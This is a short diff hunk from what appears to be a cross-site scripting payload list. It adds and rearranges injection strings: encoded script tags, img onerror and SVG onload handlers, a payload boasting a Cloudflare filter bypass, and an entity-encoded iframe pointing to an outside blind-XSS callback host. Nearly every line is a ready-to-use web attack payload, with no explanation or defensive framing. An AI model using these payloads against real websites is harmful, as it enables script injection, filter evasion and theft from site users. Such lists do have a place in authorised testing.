@@ -10,7 +10,9 @@ javascript:var{a:onerror}={a:%2561lert};throw%20origin
 '%3e%3cscript%3ealert(5*5)%3c%2fscript%3eejj4sbx5w4o
 1%27;--<img%20src=x%20onerror=javascript:alert(document.domain)> 
 '-alert?.(1)-'
-"><iframesrcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;#116;&#116;&#112;&#115;&#58;&#47;&#47;test.bxss.in&#34;&#59;&#117;&#109;&#101;&#110;&#116;&#46;&#62;">
+">
+1'"><img/src/onerror​=.1|alert``>
+<iframesrcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;#116;&#116;&#112;&#115;&#58;&#47;&#47;test.bxss.in&#34;&#59;&#117;&#109;&#101;&#110;&#116;&#46;&#62;">
 <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
 1'"><img/src/onerror​=.1|alert``>
 "><script>alert`1`</script>
